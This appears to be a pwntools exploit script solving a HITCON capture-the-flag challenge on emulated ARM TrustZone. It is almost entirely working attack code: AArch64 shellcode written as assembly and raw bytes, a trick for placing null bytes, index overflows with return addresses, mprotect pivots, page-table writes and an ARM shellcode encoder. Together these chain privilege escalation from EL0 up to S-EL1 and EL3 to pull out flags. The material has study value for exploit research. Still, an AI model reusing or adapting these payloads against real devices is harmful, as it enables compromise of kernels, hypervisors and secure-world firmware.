from pwn import *
import binascii
import os

# compile all shellcode blobs
os.system("./compile.sh")

flags = []

context.log_level = "DEBUG"
p = process("./run.sh")

# our special buffer is now writeable
# put the (mostly) alphanumeric read shellcode into it, using backwards writes to place null bytes

"""
; set up read call
mov x0, x2
mov x1, x3
add x1, x1, 0x1000
mov x2, #0xFFF
sub  x3, x19, #0x1f0

; read each byte of shellcode in
loop:
blr x3
add x1, x1, #1
sub x2, x2, #1
mov x0, x5
cbnz x2, loop

; set up mprotect call, with some funkiness to avoid spaces and too many nulls
add x3, x3, 0x18
mov x0, x1
mov x1, 0x1FFF
sub x1, x1, 0xFFF
sub x0, x0, 0xFFF
sub x2, x8, 0x3a

; call mprotect, then jump to shellcode (reuse blr to avoid wasting nulls)
call:
blr x3
add x3, x30, #0xfb4
b call
"""

payload = "\xe0\x03\x02\xaa\xe1\x03\x03\xaa\x21\x04\x40\x91\xe2\xff\x81\xd2\x63\xc2\x07\xd1\x60\x00\x3f\xd6\x21\x04\x00\x91\x42\x04\x00\xd1\xe0\x03\x05\xaa\x82\xff\xff\xb5\x63\x60\x00\x91\xe0\x03\x01\xaa\xe1\xff\x83\xd2\x21\xfc\x3f\xd1\x00\xfc\x3f\xd1\x02\xe9\x00\xd1\x60\x00\x3f\xd6\xc3\xd3\x3e\x91\xfe\xff\xff\x17"

# padd with some nop-like instructions that can be safely clobbered
payload = "\xe5\x03\x06\xaa"*2 + payload

while "\x00" in payload:
    temp = payload.replace("\x00", "\xFF")
    p.recvuntil("cmd> ")
    p.sendline("1")
    p.recvuntil("index: ")
    p.sendline("4096" + " "*0x104 + "\x70\x1b\x40") # ret and do nothing
    p.recvuntil("key: ")
    p.sendline(temp)

    payload = "\x00".join(payload.split("\x00")[:-1])

# send last part of payload
p.recvuntil("cmd> ")
p.sendline("1")
p.recvuntil("index: ")
p.sendline("4096" + " "*0x104 + "\x70\x1b\x40") # ret and do nothing
p.recvuntil("key: ")
p.sendline(payload)

# trigger call to mprotect (buffer becomes executable-only)
p.recvuntil("cmd> ")
p.sendline("1")
p.recvuntil("index: ")
p.sendline("4096" + " "*0x104 + "\x68\x1b\x40") # mprotect syscall
p.recvuntil("key: ")
p.sendline("\xe5\x03\x06\xaa") # len of 4 is exec

# execute our shellcode - this will stage 2 into the trustlet's writeable mapping, then mprotect and pivot to it
p.recvuntil("cmd> ")
p.sendline("3")
p.recvuntil("index: ")
p.sendline("0")

# send the second stage payload, which can be any chars
# this will first print out the flag for EL0, and then exploit EL1
with open("el0-raw.o", "rb") as f:
    payload = f.read()
payload = payload.ljust(0xFFF, "\x00")
p.send(payload)

# Receive the EL0 flags
p.recvuntil("Flag (EL0): ")
el0_flag = p.recvline()
flags.append(el0_flag)

print "el0_flag: %s" % el0_flag
print flags

# Send the EL1 shellcode
with open("el1-raw.o", "rb") as f:
    payload = f.read()

# add a bunch of nops
payload = "\x1f\x20\x03\xd5"*(0x80/4) + payload
payload = payload.ljust(0x1000, "\x00")
p.send(payload)

# Send payload to write to El1 page tables
p.send("\x83\x54\x03")
p.send("\x00")

# Receive the EL1 flags
p.recvuntil("Flag (EL1): ")
el1_flag = p.recvline()
flags.append(el1_flag)

print "el1_flag: %s" % el1_flag
print flags

# Send the EL2 shellcode
with open("el2-raw.o", "rb") as f:
    payload = f.read()

payload = payload.ljust(0xA00, "\x00")

# add a jump back to the payload start
payload = payload + "\x48\x00\x00\x58\x00\x01\x3f\xd6\x00\x10\x10\x40\x00\x00\x00\x00"
payload = payload.ljust(0xFF0, "\x00")
p.send(payload)

p.recvline()
el2_flag = p.recvline()
flags.append(el2_flag)

print "el2_flag: %s" % el2_flag
print flags

# set up a clean slate, this time with the arm32 binary
p.close()

p = process("./run-secure.sh")

# trigger el1 code execution again
payload = "\xe0\x03\x02\xaa\xe1\x03\x03\xaa\x21\x04\x40\x91\xe2\xff\x81\xd2\x63\xc2\x07\xd1\x60\x00\x3f\xd6\x21\x04\x00\x91\x42\x04\x00\xd1\xe0\x03\x05\xaa\x82\xff\xff\xb5\x63\x60\x00\x91\xe0\x03\x01\xaa\xe1\xff\x83\xd2\x21\xfc\x3f\xd1\x00\xfc\x3f\xd1\x02\xe9\x00\xd1\x60\x00\x3f\xd6\xc3\xd3\x3e\x91\xfe\xff\xff\x17"
payload = "\xe5\x03\x06\xaa"*2 + payload
while "\x00" in payload:
    temp = payload.replace("\x00", "\xFF")
    p.recvuntil("cmd> ")
    p.sendline("1")
    p.recvuntil("index: ")
    p.sendline("4096" + " "*0x104 + "\x70\x1b\x40") # ret and do nothing
    p.recvuntil("key: ")
    p.sendline(temp)
    payload = "\x00".join(payload.split("\x00")[:-1])

# send last part of payload
p.recvuntil("cmd> ")
p.sendline("1")
p.recvuntil("index: ")
p.sendline("4096" + " "*0x104 + "\x70\x1b\x40") # ret and do nothing
p.recvuntil("key: ")
p.sendline(payload)

# trigger call to mprotect (buffer becomes executable-only)
p.recvuntil("cmd> ")
p.sendline("1")
p.recvuntil("index: ")
p.sendline("4096" + " "*0x104 + "\x68\x1b\x40") # mprotect syscall
p.recvuntil("key: ")
p.sendline("\xe5\x03\x06\xaa") # len of 4 is exec

# execute our shellcode - this will stage 2 into the trustlet's writeable mapping, then mprotect and pivot to it
p.recvuntil("cmd> ")
p.sendline("3")
p.recvuntil("index: ")
p.sendline("0")

with open("el0-raw.o", "rb") as f:
    payload = f.read()
payload = payload.ljust(0xFFF, "\x00")
p.send(payload)

# Ignore the flag
p.recvuntil("Flag (EL0): ")
p.recvline()

# Send shellcode to attack S-EL0
with open("sel0-raw.o", "rb") as f:
    payload = f.read()

# add a bunch of nops
payload = "\x1f\x20\x03\xd5"*(0x80/4) + payload
payload = payload.ljust(0x1000, "\x00")
print "sending payload"
p.send(payload)

# Send payload to write to El1 page tables
p.send("\x83\x54\x03")
p.send("\x00")

# Ignore EL1 flag
p.recvuntil("Flag (EL1): ")
p.recvline()

with open("sel0-stager-raw.o", "rb") as f:
    payload = f.read()
payload = payload.ljust(0xD00, "\x00")

def encode_arm_shellcode(blob):

    # flip bytes for endianness properly
    instpart = blob.split("\xAA\xAA")[0]
    instpart = "".join([instpart[i^1] for i in range(len(instpart))]) + "\xAA\xAA"

    x = 0
    datapart = blob.split("\xAA\xAA")[1]

    while x < len(datapart):
        instpart = instpart + (datapart[x:x+4][::-1])
        x = x + 4

    return instpart

# Send our stager payload
payload = encode_arm_shellcode(payload)
p.send(payload)

# Send the payload to pop S-EL0
with open("sel0-flag-raw.o", "rb") as f:
    payload = f.read()
payload = payload.ljust(0xD00, "\x00")
p.send(payload)

# receive S-EL0 flag
sel0_flag = p.recvuntil("hitcon")[-6:] + p.recvuntil("}")
flags.append(sel0_flag)

print "sel0_flag: %s" % sel0_flag
print flags

# Send the payload read the flag from S-EL1
with open("sel1-el3-raw.o", "rb") as f:
    payload = f.read()
payload = payload.ljust(0x500, "\x00")

# At this time we also need the payload to print flag from EL3
with open("el3-raw.o", "rb") as f:
    payload = payload + f.read()

payload = payload.ljust(0xD00, "\x00")
p.send(payload)

# Send EL2 stub payload to pop S-EL1
with open("el2-redux-raw.o", "rb") as f:
    payload = f.read()
payload = payload.ljust(0xA00, "\x00")

# add a jump back to the payload start
payload = payload + "\x48\x00\x00\x58\x00\x01\x1f\xd6\x00\x10\x10\x40\x00\x00\x00\x00"
payload = payload.ljust(0xFF0, "\x00")
p.send(payload)

# receive S-EL1 flag
sel1_flag = p.recvuntil("hitcon")[-6:] + p.recvuntil("}")
flags.append(sel1_flag)

print "sel1_flag: %s" % sel1_flag
print flags

# receive EL3 flag
el3_flag = p.recvuntil("hitcon")[-6:] + p.recvuntil("}")
flags.append(el3_flag)

print "el3_flag: %s" % el3_flag
print flags

p.recvall()
